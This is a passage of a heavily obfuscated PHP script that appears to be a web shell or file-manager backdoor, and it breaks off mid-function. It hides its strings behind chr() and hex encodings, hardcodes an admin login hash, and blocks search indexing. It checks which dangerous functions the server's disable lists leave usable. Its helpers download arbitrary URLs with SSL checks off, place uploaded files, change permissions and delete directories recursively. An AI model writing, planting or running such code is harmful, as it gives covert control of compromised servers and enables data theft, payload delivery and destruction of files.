<?php

if (!function_exists("\x69\x73\x5f\x66\x6e\x5f\x75\x73\x61\x62\x6c\x65")) {
    function is_fn_usable($_ba896e)
    {
        
        if (!function_exists($_ba896e))
            return false;

        
        $_b204a5 = (string)@ini_get(chr(100).chr(105).chr(115).chr(97).chr(98).chr(108).chr(101).chr(95).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(115));
        $_4c9ad0 = (string)@ini_get(chr(115).chr(117).chr(104).chr(111).chr(115).chr(105).chr(110).chr(46).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(111).chr(114).chr(46).chr(102).chr(117).chr(110).chr(99).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(108).chr(105).chr(115).chr(116));

        $_1a9045 = array();
        if ($_b204a5 !== '')
            $_1a9045 = array_merge($_1a9045, array_map("\x74\x72\x69\x6d", explode("\x2c", $_b204a5)));
        if ($_4c9ad0 !== "")
            $_1a9045 = array_merge($_1a9045, array_map("\x74\x72\x69\x6d", explode("\x2c", $_4c9ad0)));

        if (!empty($_1a9045)) {
            $_1a9045 = array_filter(array_map(chr(115).chr(116).chr(114).chr(116).chr(111).chr(108).chr(111).chr(119).chr(101).chr(114), $_1a9045));
            if (in_array(strtolower($_ba896e), $_1a9045, true))
                return false;
        }
        return true;
    }
}
if (function_exists("\x64\x61\x74\x65\x5f\x64\x65\x66\x61\x75\x6c\x74\x5f\x74\x69\x6d\x65\x7a\x6f\x6e\x65\x5f\x73\x65\x74")) {
    date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : chr(85).chr(84).chr(67));
}


$_ce267e = sys_get_temp_dir();
if (!is_writable($_ce267e)) {
    $_724241 = isset($_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(70).chr(73).chr(76).chr(69).chr(78).chr(65).chr(77).chr(69)]) ? @realpath($_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(70).chr(73).chr(76).chr(69).chr(78).chr(65).chr(77).chr(69)]) : "";
    $_ce267e = ($_724241 ? dirname($_724241) : sys_get_temp_dir()) . "\x2f\x2e\x73\x65\x73\x73";
    if (!is_dir($_ce267e)) @mkdir($_ce267e, 0700, true);
}
@ini_set(chr(115).chr(101).chr(115).chr(115).chr(105).chr(111).chr(110).chr(46).chr(115).chr(97).chr(118).chr(101).chr(95).chr(112).chr(97).chr(116).chr(104), $_ce267e);
session_start();
if (empty($_SESSION["\x63\x73\x72\x66"])) {
    $_SESSION[chr(99).chr(115).chr(114).chr(102)] = bin2hex(_f2787c8d5(16));
}


header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x75\x74\x66\x2d\x38");
header("\x58\x2d\x52\x6f\x62\x6f\x74\x73\x2d\x54\x61\x67\x3a\x20\x6e\x6f\x69\x6e\x64\x65\x78\x2c\x20\x6e\x6f\x66\x6f\x6c\x6c\x6f\x77\x2c\x20\x6e\x6f\x61\x72\x63\x68\x69\x76\x65\x2c\x20\x6e\x6f\x73\x6e\x69\x70\x70\x65\x74\x2c\x20\x6e\x6f\x69\x6d\x61\x67\x65\x69\x6e\x64\x65\x78", true);
header(chr(82).chr(101).chr(102).chr(101).chr(114).chr(114).chr(101).chr(114).chr(45).chr(80).chr(111).chr(108).chr(105).chr(99).chr(121).chr(58).chr(32).chr(110).chr(111).chr(45).chr(114).chr(101).chr(102).chr(101).chr(114).chr(114).chr(101).chr(114));
header(chr(88).chr(45).chr(70).chr(114).chr(97).chr(109).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(68).chr(69).chr(78).chr(89));
header("\x43\x61\x63\x68\x65\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x3a\x20\x6e\x6f\x2d\x73\x74\x6f\x72\x65\x2c\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65\x2c\x20\x6d\x75\x73\x74\x2d\x72\x65\x76\x61\x6c\x69\x64\x61\x74\x65\x2c\x20\x6d\x61\x78\x2d\x61\x67\x65\x3d\x30");
header(chr(80).chr(114).chr(97).chr(103).chr(109).chr(97).chr(58).chr(32).chr(110).chr(111).chr(45).chr(99).chr(97).chr(99).chr(104).chr(101));
header(chr(69).chr(120).chr(112).chr(105).chr(114).chr(101).chr(115).chr(58).chr(32).chr(48));


define(chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82), chr(97).chr(100).chr(109).chr(105).chr(110));
define(chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(65).chr(83).chr(83).chr(95).chr(72).chr(65).chr(83).chr(72), chr(36).chr(50).chr(97).chr(36).chr(49).chr(50).chr(36).chr(116).chr(86).chr(100).chr(105).chr(52).chr(68).chr(69).chr(86).chr(57).chr(107).chr(117).chr(109).chr(78).chr(112).chr(52).chr(88).chr(99).chr(81).chr(47).chr(69).chr(69).chr(46).chr(76).chr(89).chr(83).chr(86).chr(50).chr(118).chr(103).chr(78).chr(55).chr(84).chr(99).chr(71).chr(84).chr(88).chr(76).chr(68).chr(106).chr(119).chr(121).chr(53).chr(86).chr(86).chr(86).chr(106).chr(48).chr(85).chr(107).chr(66).chr(112).chr(108).chr(117));


if (!function_exists("\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65")) {
    function http_response_code($_722b51 = NULL)
    {
        if ($_722b51 !== NULL) {
            $_1f6a87 = chr(85).chr(110).chr(107).chr(110).chr(111).chr(119).chr(110).chr(32).chr(69).chr(114).chr(114).chr(111).chr(114);
            switch ($_722b51) {
                case 100:
                    $_1f6a87 = "\x43\x6f\x6e\x74\x69\x6e\x75\x65";
                    break;
                case 101:
                    $_1f6a87 = chr(83).chr(119).chr(105).chr(116).chr(99).chr(104).chr(105).chr(110).chr(103).chr(32).chr(80).chr(114).chr(111).chr(116).chr(111).chr(99).chr(111).chr(108).chr(115);
                    break;
                case 200:
                    $_1f6a87 = chr(79).chr(75);
                    break;
                case 201:
                    $_1f6a87 = chr(67).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100);
                    break;
                case 202:
                    $_1f6a87 = "\x41\x63\x63\x65\x70\x74\x65\x64";
                    break;
                case 203:
                    $_1f6a87 = "\x4e\x6f\x6e\x2d\x41\x75\x74\x68\x6f\x72\x69\x74\x61\x74\x69\x76\x65\x20\x49\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e";
                    break;
                case 204:
                    $_1f6a87 = "\x4e\x6f\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 205:
                    $_1f6a87 = "\x52\x65\x73\x65\x74\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 206:
                    $_1f6a87 = "\x50\x61\x72\x74\x69\x61\x6c\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 300:
                    $_1f6a87 = "\x4d\x75\x6c\x74\x69\x70\x6c\x65\x20\x43\x68\x6f\x69\x63\x65\x73";
                    break;
                case 301:
                    $_1f6a87 = "\x4d\x6f\x76\x65\x64\x20\x50\x65\x72\x6d\x61\x6e\x65\x6e\x74\x6c\x79";
                    break;
                case 302:
                    $_1f6a87 = chr(77).chr(111).chr(118).chr(101).chr(100).chr(32).chr(84).chr(101).chr(109).chr(112).chr(111).chr(114).chr(97).chr(114).chr(105).chr(108).chr(121);
                    break;
                case 303:
                    $_1f6a87 = "\x53\x65\x65\x20\x4f\x74\x68\x65\x72";
                    break;
                case 304:
                    $_1f6a87 = "\x4e\x6f\x74\x20\x4d\x6f\x64\x69\x66\x69\x65\x64";
                    break;
                case 305:
                    $_1f6a87 = "\x55\x73\x65\x20\x50\x72\x6f\x78\x79";
                    break;
                case 400:
                    $_1f6a87 = "\x42\x61\x64\x20\x52\x65\x71\x75\x65\x73\x74";
                    break;
                case 401:
                    $_1f6a87 = "\x55\x6e\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64";
                    break;
                case 402:
                    $_1f6a87 = chr(80).chr(97).chr(121).chr(109).chr(101).chr(110).chr(116).chr(32).chr(82).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100);
                    break;
                case 403:
                    $_1f6a87 = chr(70).chr(111).chr(114).chr(98).chr(105).chr(100).chr(100).chr(101).chr(110);
                    break;
                case 404:
                    $_1f6a87 = "\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64";
                    break;
                case 405:
                    $_1f6a87 = chr(77).chr(101).chr(116).chr(104).chr(111).chr(100).chr(32).chr(78).chr(111).chr(116).chr(32).chr(65).chr(108).chr(108).chr(111).chr(119).chr(101).chr(100);
                    break;
                case 406:
                    $_1f6a87 = chr(78).chr(111).chr(116).chr(32).chr(65).chr(99).chr(99).chr(101).chr(112).chr(116).chr(97).chr(98).chr(108).chr(101);
                    break;
                case 407:
                    $_1f6a87 = chr(80).chr(114).chr(111).chr(120).chr(121).chr(32).chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(82).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100);
                    break;
                case 408:
                    $_1f6a87 = "\x52\x65\x71\x75\x65\x73\x74\x20\x54\x69\x6d\x65\x2d\x6f\x75\x74";
                    break;
                case 409:
                    $_1f6a87 = chr(67).chr(111).chr(110).chr(102).chr(108).chr(105).chr(99).chr(116);
                    break;
                case 410:
                    $_1f6a87 = "\x47\x6f\x6e\x65";
                    break;
                case 411:
                    $_1f6a87 = "\x4c\x65\x6e\x67\x74\x68\x20\x52\x65\x71\x75\x69\x72\x65\x64";
                    break;
                case 412:
                    $_1f6a87 = chr(80).chr(114).chr(101).chr(99).chr(111).chr(110).chr(100).chr(105).chr(116).chr(105).chr(111).chr(110).chr(32).chr(70).chr(97).chr(105).chr(108).chr(101).chr(100);
                    break;
                case 413:
                    $_1f6a87 = chr(82).chr(101).chr(113).chr(117).chr(101).chr(115).chr(116).chr(32).chr(69).chr(110).chr(116).chr(105).chr(116).chr(121).chr(32).chr(84).chr(111).chr(111).chr(32).chr(76).chr(97).chr(114).chr(103).chr(101);
                    break;
                case 414:
                    $_1f6a87 = "\x52\x65\x71\x75\x65\x73\x74\x2d\x55\x52\x49\x20\x54\x6f\x6f\x20\x4c\x61\x72\x67\x65";
                    break;
                case 415:
                    $_1f6a87 = "\x55\x6e\x73\x75\x70\x70\x6f\x72\x74\x65\x64\x20\x4d\x65\x64\x69\x61\x20\x54\x79\x70\x65";
                    break;
                case 500:
                    $_1f6a87 = "\x49\x6e\x74\x65\x72\x6e\x61\x6c\x20\x53\x65\x72\x76\x65\x72\x20\x45\x72\x72\x6f\x72";
                    break;
                case 501:
                    $_1f6a87 = "\x4e\x6f\x74\x20\x49\x6d\x70\x6c\x65\x6d\x65\x6e\x74\x65\x64";
                    break;
                case 502:
                    $_1f6a87 = "\x42\x61\x64\x20\x47\x61\x74\x65\x77\x61\x79";
                    break;
                case 503:
                    $_1f6a87 = chr(83).chr(101).chr(114).chr(118).chr(105).chr(99).chr(101).chr(32).chr(85).chr(110).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101);
                    break;
                case 504:
                    $_1f6a87 = chr(71).chr(97).chr(116).chr(101).chr(119).chr(97).chr(121).chr(32).chr(84).chr(105).chr(109).chr(101).chr(45).chr(111).chr(117).chr(116);
                    break;
                case 505:
                    $_1f6a87 = "\x48\x54\x54\x50\x20\x56\x65\x72\x73\x69\x6f\x6e\x20\x6e\x6f\x74\x20\x73\x75\x70\x70\x6f\x72\x74\x65\x64";
                    break;
            }
            $_ce189c = (isset($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(80).chr(82).chr(79).chr(84).chr(79).chr(67).chr(79).chr(76)]) ? $_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(80).chr(82).chr(79).chr(84).chr(79).chr(67).chr(79).chr(76)] : chr(72).chr(84).chr(84).chr(80).chr(47).chr(49).chr(46).chr(48));
            header($_ce189c . "\x20" . $_722b51 . chr(32) . $_1f6a87);
            $GLOBALS["\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65"] = $_722b51;
        }
        else {
            $_722b51 = (isset($GLOBALS["\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65"]) ? $GLOBALS[chr(104).chr(116).chr(116).chr(112).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(99).chr(111).chr(100).chr(101)] : 200);
        }
        return $_722b51;
    }
}

if (!function_exists(chr(115).chr(121).chr(115).chr(95).chr(103).chr(101).chr(116).chr(95).chr(116).chr(101).chr(109).chr(112).chr(95).chr(100).chr(105).chr(114))) {
    function sys_get_temp_dir()
    {
        if (!empty($_ENV[chr(84).chr(77).chr(80)])) {
            return realpath($_ENV["\x54\x4d\x50"]);
        }
        if (!empty($_ENV[chr(84).chr(77).chr(80).chr(68).chr(73).chr(82)])) {
            return realpath($_ENV[chr(84).chr(77).chr(80).chr(68).chr(73).chr(82)]);
        }
        if (!empty($_ENV[chr(84).chr(69).chr(77).chr(80)])) {
            return realpath($_ENV["\x54\x45\x4d\x50"]);
        }
        $_d6a57f = tempnam(dirname(__FILE__), "");
        if (file_exists($_d6a57f)) {
            unlink($_d6a57f);
            return realpath(dirname($_d6a57f));
        }
        return null;
    }
}

if (!function_exists(chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115))) {
    if (!defined("\x46\x49\x4c\x45\x5f\x41\x50\x50\x45\x4e\x44")) {
        define("\x46\x49\x4c\x45\x5f\x41\x50\x50\x45\x4e\x44", 8);
    }
    function file_put_contents($_2d246f, $_6fb0dc, $_ae73f1 = 0)
    {
        $_4ada7a = ($_ae73f1 & FILE_APPEND) ? chr(97).chr(98) : chr(119).chr(98);
        $_bb9824 = @fopen($_2d246f, $_4ada7a);
        if ($_bb9824 === false) {
            return false;
        }
        $_241098 = @fwrite($_bb9824, $_6fb0dc);
        @fclose($_bb9824);
        return $_241098;
    }
}

if (!function_exists("\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x70\x79\x5f\x74\x6f\x5f\x73\x74\x72\x65\x61\x6d")) {
    function stream_copy_to_stream($_25667d, $_c1b966)
    {
        $_bb2f6b = 0;
        while (!feof($_25667d)) {
            $_4c9718 = @fread($_25667d, 8192);
            if ($_4c9718 === false || $_4c9718 === "") {
                break;
            }
            $_e5a89c = @fwrite($_c1b966, $_4c9718);
            if ($_e5a89c === false) {
                break;
            }
            $_bb2f6b += $_e5a89c;
        }
        return $_bb2f6b;
    }
}

function h($_3c0f3b)
{
    return htmlspecialchars($_3c0f3b, ENT_QUOTES, "\x55\x54\x46\x2d\x38");
}


if (!function_exists("\x6a\x65")) {
    function je($_c4bf7e)
    {
        if (function_exists("\x6a\x73\x6f\x6e\x5f\x65\x6e\x63\x6f\x64\x65")) {
            return json_encode($_c4bf7e);
        }
        
        if (is_bool($_c4bf7e))
            return $_c4bf7e ? chr(116).chr(114).chr(117).chr(101) : chr(102).chr(97).chr(108).chr(115).chr(101);
        if (is_numeric($_c4bf7e))
            return (string)$_c4bf7e;
        if ($_c4bf7e === null)
            return "\x6e\x75\x6c\x6c";
        $_3c0f3b = str_replace(
            array("\x5c", "\x22", chr(13), chr(10), chr(9), "\x2f"),
            array("\x5c\x5c", chr(92).chr(34), "\x5c\x72", chr(92).chr(110), chr(92).chr(116), chr(92).chr(47)),
            (string)$_c4bf7e
        );
        return chr(34) . $_3c0f3b . chr(34);
    }
}

if (!function_exists("\x68\x61\x73\x68\x5f\x65\x71\x75\x61\x6c\x73")) {
    function hash_equals($_a2c7dc, $_893a28)
    {
        if (!is_string($_a2c7dc) || !is_string($_893a28))
            return false;
        $_e5a89c = strlen($_a2c7dc);
        if ($_e5a89c !== strlen($_893a28))
            return false;
        $_560e65 = 0;
        for ($_81ebb5 = 0; $_81ebb5 < $_e5a89c; $_81ebb5++)
            $_560e65 |= ord($_a2c7dc[$_81ebb5]) ^ ord($_893a28[$_81ebb5]);
        return $_560e65 === 0;
    }
}


if (!function_exists(chr(105).chr(115).chr(95).chr(102).chr(110).chr(95).chr(117).chr(115).chr(97).chr(98).chr(108).chr(101))) {
    function is_fn_usable($_ba896e)
    {
        if (!function_exists($_ba896e))
            return false;

        $_b204a5 = (string)@ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73");
        $_4c9ad0 = (string)@ini_get(chr(115).chr(117).chr(104).chr(111).chr(115).chr(105).chr(110).chr(46).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(111).chr(114).chr(46).chr(102).chr(117).chr(110).chr(99).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(108).chr(105).chr(115).chr(116)); 

        $_1a9045 = array();
        if ($_b204a5 !== '') {
            $_1a9045 = array_merge($_1a9045, array_map(chr(116).chr(114).chr(105).chr(109), explode(chr(44), $_b204a5)));
        }
        if ($_4c9ad0 !== '') {
            $_1a9045 = array_merge($_1a9045, array_map("\x74\x72\x69\x6d", explode(chr(44), $_4c9ad0)));
        }
        $_1a9045 = array_filter(array_map("\x73\x74\x72\x74\x6f\x6c\x6f\x77\x65\x72", $_1a9045));
        return !in_array(strtolower($_ba896e), $_1a9045, true);
    }
}

function _f2787c8d5($_e5a89c)
{
    if (is_fn_usable(chr(114).chr(97).chr(110).chr(100).chr(111).chr(109).chr(95).chr(98).chr(121).chr(116).chr(101).chr(115)))
        return random_bytes($_e5a89c);
    if (is_fn_usable(chr(111).chr(112).chr(101).chr(110).chr(115).chr(115).chr(108).chr(95).chr(114).chr(97).chr(110).chr(100).chr(111).chr(109).chr(95).chr(112).chr(115).chr(101).chr(117).chr(100).chr(111).chr(95).chr(98).chr(121).chr(116).chr(101).chr(115))) {
        $_b099e3 = false;
        $_893a28 = openssl_random_pseudo_bytes($_e5a89c, $_b099e3);
        if ($_893a28 !== false && $_b099e3)
            return $_893a28;
    }
    $_862fdd = '';
    for ($_81ebb5 = 0; $_81ebb5 < $_e5a89c; $_81ebb5++)
        $_862fdd .= chr(mt_rand(0, 255));
    return $_862fdd;
}
function _fb575e97d($_893a28)
{
    $_caeef0 = array(chr(66), chr(75).chr(66), "\x4d\x42", chr(71).chr(66), chr(84).chr(66));
    $_81ebb5 = 0;
    while ($_893a28 >= 1024 && $_81ebb5 < count($_caeef0) - 1) {
        $_893a28 /= 1024;
        $_81ebb5++;
    }
    return ($_81ebb5 ? number_format($_893a28, 2) : (string)$_893a28) . chr(32) . $_caeef0[$_81ebb5];
}
function _f592888d3($_bb9824)
{
    $_36defd = @fileperms($_bb9824);
    if ($_36defd === false)
        return chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63);
    $_d09c06 = ($_36defd & 0x4000) ? chr(100) : (($_36defd & 0xA000) ? chr(108) : chr(45));
    $_3c0f3b = (($_36defd & 0x0100) ? "\x72" : "\x2d") . (($_36defd & 0x0080) ? "\x77" : chr(45)) . (($_36defd & 0x0040) ? chr(120) : "\x2d"); 
    $_3c0f3b .= (($_36defd & 0x0020) ? "\x72" : "\x2d") . (($_36defd & 0x0010) ? "\x77" : "\x2d") . (($_36defd & 0x0008) ? chr(120) : chr(45)); 
    $_3c0f3b .= (($_36defd & 0x0004) ? chr(114) : "\x2d") . (($_36defd & 0x0002) ? "\x77" : chr(45)) . (($_36defd & 0x0001) ? chr(120) : "\x2d"); 
    return $_d09c06 . $_3c0f3b;
}
function _f84eed38e($_bb9824)
{
    $_233452 = @fileowner($_bb9824);
    if ($_233452 === false)
        return chr(63);
    
    
    static $_f6e672 = array();
    if (isset($_f6e672[$_233452]))
        return $_f6e672[$_233452];
    $_862fdd = (string)$_233452;
    if (function_exists("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64")) {
        $_cde79b = @posix_getpwuid($_233452);
        if ($_cde79b && isset($_cde79b[chr(110).chr(97).chr(109).chr(101)]))
            $_862fdd = $_cde79b[chr(110).chr(97).chr(109).chr(101)];
    }
    $_f6e672[$_233452] = $_862fdd;
    return $_862fdd;
}
function _f8a1dd3b2($_3c0f3b)
{
    $_3c0f3b = trim($_3c0f3b);
    if ($_3c0f3b === "")
        return 0644;
    if (ctype_digit($_3c0f3b)) {
        if ($_3c0f3b[0] !== chr(48))
            $_3c0f3b = "\x30" . $_3c0f3b;
        return intval($_3c0f3b, 8);
    }
    return 0644;
}
function _f6b64c028($_36defd)
{
    if (is_dir($_36defd) || !is_file($_36defd))
        return false;
    $_337bff = strtolower(pathinfo($_36defd, PATHINFO_EXTENSION));
    $_1f6a87 = array(chr(116).chr(120).chr(116), chr(109).chr(100), chr(106).chr(115).chr(111).chr(110), chr(106).chr(115), chr(116).chr(115), "\x63\x73\x73", "\x73\x63\x73\x73", "\x6c\x65\x73\x73", chr(104).chr(116).chr(109).chr(108), chr(104).chr(116).chr(109), chr(120).chr(109).chr(108), chr(115).chr(118).chr(103), chr(112).chr(104).chr(112), "\x70\x68\x74\x6d\x6c", "\x69\x6e\x63", "\x69\x6e\x69", chr(99).chr(102).chr(103), "\x65\x6e\x76", "\x79\x6d\x6c", "\x79\x61\x6d\x6c", "\x70\x79", chr(114).chr(98), chr(103).chr(111), "\x72\x73", "\x63", "\x68", chr(99).chr(112).chr(112), "\x68\x70\x70", chr(106).chr(97).chr(118).chr(97), "\x6b\x74", "\x73\x71\x6c", "\x63\x73\x76", "\x6c\x6f\x67");
    if (in_array($_337bff, $_1f6a87, true))
        return true;
    $_3c0f3b = @file_get_contents($_36defd, false, null, 0, 2048);
    if ($_3c0f3b === false)
        return false;
    return (bool)preg_match("\x2f\x2f\x75", $_3c0f3b);
}
function _f0686cac3($_376c14, $_93711e)
{
    $_93711e = str_replace(chr(0), '', $_93711e);
    if ($_93711e === '')
        return $_376c14;
    if ($_93711e[0] === DIRECTORY_SEPARATOR || preg_match(chr(126).chr(94).chr(91).chr(65).chr(45).chr(90).chr(97).chr(45).chr(122).chr(93).chr(58).chr(92).chr(92).chr(126), $_93711e))
        return $_93711e;
    return rtrim($_376c14, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_93711e;
}
function _fb2abba76($_425e76)
{
    $_84c87b = @opendir($_425e76);
    if ($_84c87b === false)
        return array();
    $_0b4e31 = array();
    while (false !== ($_62af60 = readdir($_84c87b))) {
        if ($_62af60 === chr(46) || $_62af60 === chr(46).chr(46))
            continue;
        $_0b4e31[] = $_62af60;
    }
    closedir($_84c87b);
    return $_0b4e31;
}
function _f63298bd4($_36defd)
{
    if (!file_exists($_36defd))
        return true;
    if (is_file($_36defd) || is_link($_36defd))
        return @unlink($_36defd);
    $_c3adcc = true;
    $_84c87b = @opendir($_36defd);
    if ($_84c87b === false)
        return false;
    while (false !== ($_c4bf7e = readdir($_84c87b))) {
        if ($_c4bf7e === "\x2e" || $_c4bf7e === chr(46).chr(46))
            continue;
        $_c3adcc = _f63298bd4($_36defd . DIRECTORY_SEPARATOR . $_c4bf7e) && $_c3adcc;
    }
    closedir($_84c87b);
    return @rmdir($_36defd) && $_c3adcc;
}
function _f8cf557bc($_06b18c, $_c1b966)
{
    $_9043da = array();
    if (@move_uploaded_file($_06b18c, $_c1b966))
        return array(true, null);
    $_9043da[] = chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101);
    if (@rename($_06b18c, $_c1b966))
        return array(true, null);
    $_9043da[] = "\x72\x65\x6e\x61\x6d\x65";
    if (@copy($_06b18c, $_c1b966))
        return array(true, null);
    $_9043da[] = chr(99).chr(111).chr(112).chr(121);
    $_fa1597 = @file_get_contents($_06b18c);
    if ($_fa1597 !== false && @file_put_contents($_c1b966, $_fa1597) !== false)
        return array(true, null);
    $_9043da[] = "\x67\x65\x74\x2b\x70\x75\x74";
    $_840cdb = @fopen($_06b18c, "\x72\x62");
    $_862fdd = @fopen($_c1b966, "\x77\x62");
    if ($_840cdb && $_862fdd) {
        $_4d44d9 = stream_copy_to_stream($_840cdb, $_862fdd);
        @fclose($_840cdb);
        @fclose($_862fdd);
        if ($_4d44d9 !== false)
            return array(true, null);
        $_9043da[] = chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121);
    }
    else {
        $_9043da[] = chr(102).chr(111).chr(112).chr(101).chr(110);
    }
    return array(false, implode("\x3b\x20", $_9043da) . "\x20\x66\x61\x69\x6c\x65\x64");
}
if (!function_exists("\x66\x65\x74\x63\x68\x55\x72\x6c\x54\x6f\x46\x69\x6c\x65")) {
    function fetchUrlToFile($_4f1f81, $_c1b966)
    {
        $_e7f0e9 = array();

        
        if (is_fn_usable(chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116))) {
            $_7d6e60 = @curl_init($_4f1f81);
            $_6b5f89 = @fopen($_c1b966, "\x77\x62");
            if ($_7d6e60 && $_6b5f89) {
                @curl_setopt($_7d6e60, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($_7d6e60, CURLOPT_FILE, $_6b5f89);
                @curl_setopt($_7d6e60, CURLOPT_FAILONERROR, true);
                @curl_setopt($_7d6e60, CURLOPT_USERAGENT, chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48));
                @curl_setopt($_7d6e60, CURLOPT_SSL_VERIFYPEER, false);
                @curl_setopt($_7d6e60, CURLOPT_SSL_VERIFYHOST, 0);
                @curl_setopt($_7d6e60, CURLOPT_TIMEOUT, 60);
                $_c3adcc = @curl_exec($_7d6e60);
                $_62af60 = @curl_error($_7d6e60);
                @curl_close($_7d6e60);
                @fclose($_6b5f89);

                if ($_c3adcc)
                    return array(true, null);
                $_e7f0e9[] = chr(99).chr(85).chr(82).chr(76).chr(58).chr(32) . $_62af60;
                @unlink($_c1b966);
            }
            else {
                if ($_7d6e60)
                    @curl_close($_7d6e60);
                if ($_6b5f89)
                    @fclose($_6b5f89);
                $_e7f0e9[] = chr(105).chr(110).chr(105).chr(116).chr(32).chr(99).chr(85).chr(82).chr(76).chr(47).chr(102).chr(111).chr(112).chr(101).chr(110);
            }
        }

        
        $_d97649 = @stream_context_create(array(
            "\x68\x74\x74\x70" => array(
                "\x66\x6f\x6c\x6c\x6f\x77\x5f\x6c\x6f\x63\x61\x74\x69\x6f\x6e" => 1,
                "\x74\x69\x6d\x65\x6f\x75\x74" => 60,
                chr(104).chr(101).chr(97).chr(100).chr(101).chr(114) => chr(85).chr(115).chr(101).chr(114).chr(45).chr(65).chr(103).chr(101).chr(110).chr(116).chr(58).chr(32).chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48).chr(13).chr(10),
            ),
            chr(115).chr(115).chr(108) => array(
                "\x76\x65\x72\x69\x66\x79\x5f\x70\x65\x65\x72" => false,
                chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(95).chr(112).chr(101).chr(101).chr(114).chr(95).chr(110).chr(97).chr(109).chr(101) => false,
            ),
        ));

        
        if (@copy($_4f1f81, $_c1b966, $_d97649))
            return array(true, null);
        $_e7f0e9[] = "\x63\x6f\x70\x79\x28\x75\x72\x6c\x29";

        
        $_fa1597 = @file_get_contents($_4f1f81, false, $_d97649);
        if ($_fa1597 !== false && @file_put_contents($_c1b966, $_fa1597) !== false)
            return array(true, null);
        $_e7f0e9[] = chr(103).chr(101).chr(116).chr(43).chr(112).chr(117).chr(116);

        
        $_840cdb = @fopen($_4f1f81, chr(114).chr(98), false, $_d97649);
        $_862fdd = @fopen($_c1b966, "\x77\x62");
        if ($_840cdb && $_862fdd) {
            $_4d44d9 = @stream_copy_to_stream($_840cdb, $_862fdd);
            @fclose($_840cdb);
            @fclose($_862fdd);
            if ($_4d44d9 !== false)
                return array(true, null);
            $_e7f0e9[] = "\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x70\x79";
            @unlink($_c1b966);
        }
        else {
            $_e7f0e9[] = chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(117).chr(114).chr(108).chr(47).chr(100).chr(101).chr(115).chr(116).chr(41);
        }

        return array(false, implode("\x3b\x20", $_e7f0e9) . "\x20\x66\x61\x69\x6c\x65\x64");
    }
}
function _fca8d0de2($_013f0a)
{
    $_862fdd = array();
    if (preg_match(chr(126).chr(94).chr(91).chr(65).chr(45).chr(90).chr(97).chr(45).chr(122).chr(93).chr(58).chr(92).chr(92).chr(126), $_013f0a)) {
        $_673c69 = substr($_013f0a, 0, 2);
        $_2643b2 = substr($_013f0a, 2);
        $_19b064 = array_values(array_filter(explode("\x5c\x5c", $_2643b2), "\x73\x74\x72\x6c\x65\x6e"));
        $_686b15 = $_673c69 . chr(92);
        $_862fdd[] = array($_673c69 . "\x5c", $_686b15);
        foreach ($_19b064 as $_3c0f3b) {
            $_686b15 .= $_3c0f3b . chr(92);
            $_862fdd[] = array($_3c0f3b, rtrim($_686b15, chr(92)));
        }
    }
    else {
